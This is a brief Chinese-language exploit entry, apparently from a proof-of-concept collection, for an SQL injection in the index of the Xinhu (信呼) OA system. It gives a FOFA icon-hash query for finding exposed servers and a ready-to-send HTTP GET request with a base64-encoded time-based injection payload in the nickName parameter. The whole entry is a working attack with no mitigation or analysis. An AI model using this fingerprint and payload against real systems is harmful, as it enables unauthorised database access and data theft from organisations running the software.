# 信呼OA系统index存在SQL注入漏洞



## fofa

```java
icon_hash="1652488516"
```

## poc

```java
GET /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDUpIw== HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
```

![image-20240803223232860](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408032232926.png)